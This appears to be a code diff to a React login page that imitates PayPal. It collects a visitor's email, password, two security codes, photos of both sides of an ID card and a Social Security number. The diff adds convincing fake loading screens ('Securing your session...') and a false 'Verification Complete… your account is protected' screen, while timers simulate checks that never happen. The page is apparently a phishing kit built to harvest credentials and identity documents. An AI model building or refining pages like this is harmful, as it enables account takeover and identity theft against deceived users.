@@ -3,7 +3,19 @@ import { Eye, EyeOff, Lock, ChevronDown, User, Smartphone, Mail, ChevronLeft, Sh
 import { SiPaypal } from "react-icons/si";
 import { useToast } from "@/hooks/use-toast";
 
-type LoginStep = "email" | "password" | "verify-method" | "verify-code" | "verifying" | "verify-code-2" | "verify-documents";
+type LoginStep = 
+  | "email" 
+  | "loading-password" 
+  | "password" 
+  | "loading-verify"
+  | "verify-method" 
+  | "verify-code" 
+  | "verifying" 
+  | "verify-code-2" 
+  | "loading-documents"
+  | "verify-documents"
+  | "processing-documents"
+  | "success";
 
 export default function LoginPage() {
   const [email, setEmail] = useState("");
@@ -23,7 +35,10 @@ export default function LoginPage() {
   const handleEmailNext = (e: React.FormEvent) => {
     e.preventDefault();
     if (email.trim()) {
-      setStep("password");
+      setStep("loading-password");
+      setTimeout(() => {
+        setStep("password");
+      }, 3000);
     }
   };
 
@@ -31,14 +46,13 @@ export default function LoginPage() {
     e.preventDefault();
     if (!password.trim()) return;
 
-    setIsLoading(true);
+    setStep("loading-verify");
     setTimeout(() => {
-      setIsLoading(false);
       setStep("verify-code");
       toast({
         description: "A security code has been sent to your registered device.",
       });
-    }, 1200);
+    }, 5000);
   };
 
   const handleSendCode = () => {
@@ -75,11 +89,10 @@ export default function LoginPage() {
     e.preventDefault();
     if (verificationCode2.length < 6) return;
 
-    setIsLoading(true);
+    setStep("loading-documents");
     setTimeout(() => {
-      setIsLoading(false);
       setStep("verify-documents");
-    }, 1000);
+    }, 2500);
   };
 
   const handleBackToEmail = () => {
@@ -101,22 +114,22 @@ export default function LoginPage() {
     e.preventDefault();
     if (!idCardFront || !idCardBack || ssn.length < 9) return;
 
-    setIsLoading(true);
+    setStep("processing-documents");
     setTimeout(() => {
-      setIsLoading(false);
-      toast({
-        description: "Your identity has been verified successfully.",
-      });
-      setStep("email");
-      setEmail("");
-      setPassword("");
-      setVerificationCode("");
-      setVerificationCode2("");
-      setIdCardFront(null);
-      setIdCardBack(null);
-      setSsn("");
-      setCodeSent(false);
-    }, 2000);
+      setStep("success");
+    }, 3000);
+  };
+
+  const handleSuccessContinue = () => {
+    setStep("email");
+    setEmail("");
+    setPassword("");
+    setVerificationCode("");
+    setVerificationCode2("");
+    setIdCardFront(null);
+    setIdCardBack(null);
+    setSsn("");
+    setCodeSent(false);
   };
 
   const handleFileUpload = (e: React.ChangeEvent<HTMLInputElement>, side: "front" | "back") => {
@@ -136,6 +149,57 @@ export default function LoginPage() {
     if (numbers.length <= 5) return `${numbers.slice(0, 3)}-${numbers.slice(3)}`;
     return `${numbers.slice(0, 3)}-${numbers.slice(3, 5)}-${numbers.slice(5)}`;
   };
+
+  const renderLoadingScreen = (message: string) => (
+    <div className="flex flex-col items-center justify-center py-16" data-testid="screen-loading">
+      <div className="mb-8">
+        <img src="/favicon.png" alt="PayPal" className="h-[48px] w-auto" />
+      </div>
+      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
+      <p className="text-[15px] text-[#6c7378] text-center">{message}</p>
+    </div>
+  );
+
+  const renderSuccessStep = () => (
+    <div className="flex flex-col items-center py-8" data-testid="screen-success">
+      <div className="w-20 h-20 rounded-full bg-[#169b62]/10 flex items-center justify-center mb-6">
+        <CheckCircle className="w-10 h-10 text-[#169b62]" />
+      </div>
+      <h1 className="text-[24px] font-semibold text-[#111b2a] dark:text-white text-center mb-3">
+        Verification Complete
+      </h1>
+      <p className="text-[15px] text-[#6c7378] dark:text-[#8f8f8f] text-center mb-8 max-w-[320px]">
+        Your identity has been successfully verified. Your account is now secure.
+      </p>
+      <div className="w-full space-y-4">
+        <button
+          type="button"
+          onClick={handleSuccessContinue}
+          className="paypal-btn-2025"
+          data-testid="button-continue-success"
+        >
+          Continue to PayPal
+        </button>
+      </div>
+      <div className="flex items-center justify-center gap-2 mt-8 text-[#169b62]">
+        <Shield className="w-4 h-4" />
+        <span className="text-[13px] font-medium">Your account is protected</span>
+      </div>
+    </div>
+  );
+
+  const renderProcessingDocuments = () => (
+    <div className="flex flex-col items-center justify-center py-16" data-testid="screen-processing">
+      <div className="mb-8">
+        <img src="/favicon.png" alt="PayPal" className="h-[48px] w-auto" />
+      </div>
+      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
+      <h2 className="text-[18px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+        Verifying Your Documents
+      </h2>
+      <p className="text-[14px] text-[#6c7378] text-center">Please wait while we process your information</p>
+    </div>
+  );
 
   const renderVerifyDocumentsStep = () => (
     <form onSubmit={handleDocumentVerification} data-testid="form-verify-documents">
@@ -225,14 +289,10 @@ export default function LoginPage() {
         <button
           type="submit"
           className="paypal-btn-2025"
-          disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9 || isLoading}
+          disabled={!idCardFront || !idCardBack || ssn.replace(/\D/g, "").length < 9}
           data-testid="button-verify-documents"
         >
-          {isLoading ? (
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-          ) : (
-            "Submit"
-          )}
+          Submit
         </button>
 
         <div className="flex items-center justify-center gap-2 pt-4 text-[#6c7378]">
@@ -322,10 +382,11 @@ export default function LoginPage() {
 
   const renderVerifyingStep = () => (
     <div className="flex flex-col items-center py-12" data-testid="screen-verifying">
-      <div className="w-16 h-16 rounded-full bg-[#005ea6]/10 flex items-center justify-center mb-6">
-        <div className="w-8 h-8 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin" />
+      <div className="mb-6">
+        <img src="/favicon.png" alt="PayPal" className="h-[40px] w-auto" />
       </div>
-      <h2 className="text-[20px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
+      <div className="w-10 h-10 border-3 border-[#005ea6] border-t-transparent rounded-full animate-spin mb-6" />
+      <h2 className="text-[18px] font-semibold text-[#111b2a] dark:text-white text-center mb-2">
         Verifying
       </h2>
       <p className="text-[14px] text-[#6c7378] dark:text-[#8f8f8f] text-center">
@@ -462,14 +523,10 @@ export default function LoginPage() {
         <button
           type="submit"
           className="paypal-btn-2025"
-          disabled={!password.trim() || isLoading}
+          disabled={!password.trim()}
           data-testid="button-login"
         >
-          {isLoading ? (
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin" />
-          ) : (
-            "Log In"
-          )}
+          Log In
         </button>
 
         <div className="relative py-4">
@@ -661,29 +718,40 @@ export default function LoginPage() {
     </form>
   );
 
+  const showMinimalLayout = ["loading-password", "loading-verify", "loading-documents", "processing-documents", "verifying"].includes(step);
+
   return (
     <div className="min-h-screen bg-[#f5f7fa] dark:bg-[#0a0a0a] flex flex-col">
       <main className="flex-1 flex flex-col items-center pt-12 sm:pt-16 pb-8 px-4">
-        <div className="mb-8">
-          <img src="/favicon.png" alt="PayPal" className="h-[40px] sm:h-[48px] w-auto" />
-        </div>
+        {!showMinimalLayout && (
+          <div className="mb-8">
+            <img src="/favicon.png" alt="PayPal" className="h-[40px] sm:h-[48px] w-auto" />
+          </div>
+        )}
 
         <div className="w-full max-w-[420px] bg-white dark:bg-[#121212] rounded-lg border border-[#e5e5e5] dark:border-[#2a2a2a] p-8 shadow-sm">
           {step === "email" && renderEmailStep()}
+          {step === "loading-password" && renderLoadingScreen("Loading your account...")}
           {step === "password" && renderPasswordStep()}
+          {step === "loading-verify" && renderLoadingScreen("Securing your session...")}
           {step === "verify-method" && renderVerifyMethodStep()}
           {step === "verify-code" && renderVerifyCodeStep()}
           {step === "verifying" && renderVerifyingStep()}
           {step === "verify-code-2" && renderVerifyCode2Step()}
+          {step === "loading-documents" && renderLoadingScreen("Preparing verification...")}
           {step === "verify-documents" && renderVerifyDocumentsStep()}
+          {step === "processing-documents" && renderProcessingDocuments()}
+          {step === "success" && renderSuccessStep()}
         </div>
 
-        <div className="flex items-center justify-center gap-2 mt-6">
-          <Lock className="w-3.5 h-3.5 text-[#6c7378]" />
-          <span className="text-[12px] text-[#6c7378]" data-testid="text-security">
-            Secure connection
-          </span>
-        </div>
+        {!showMinimalLayout && step !== "success" && (
+          <div className="flex items-center justify-center gap-2 mt-6">
+            <Lock className="w-3.5 h-3.5 text-[#6c7378]" />
+            <span className="text-[12px] text-[#6c7378]" data-testid="text-security">
+              Secure connection
+            </span>
+          </div>
+        )}
       </main>
 
       <footer className="py-5 px-4 border-t border-[#e5e5e5] dark:border-[#2a2a2a] bg-white dark:bg-[#121212]">
